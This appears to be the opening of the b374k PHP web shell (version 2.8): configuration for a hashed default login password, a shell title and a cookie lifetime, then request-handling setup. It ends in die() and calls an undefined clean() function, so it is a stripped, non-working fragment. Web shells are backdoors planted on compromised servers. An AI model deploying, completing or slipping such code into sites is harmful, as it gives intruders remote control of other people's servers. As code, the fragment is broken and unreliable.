<?php
$s_pass = "fb621f5060b9f65acf8eb4232e3024140dea2b34"; // default password : b374k (login and change to new password)

$s_ver = "2.8"; // shell ver
$s_title = "b374k ".$s_ver; // shell title
$s_login_time = 3600 * 24 * 7; // cookie time (login)
$s_debug = false; // debugging mode

@ob_start();
@set_time_limit(0);
@ini_set('html_errors','0');
@clearstatcache();
define('DS', DIRECTORY_SEPARATOR);

// clean magic quotes
$_POST = clean($_POST);
$_GET = clean($_GET);
$_COOKIE = clean($_COOKIE);
$_GP = array_merge($_POST, $_GET);
die();
?>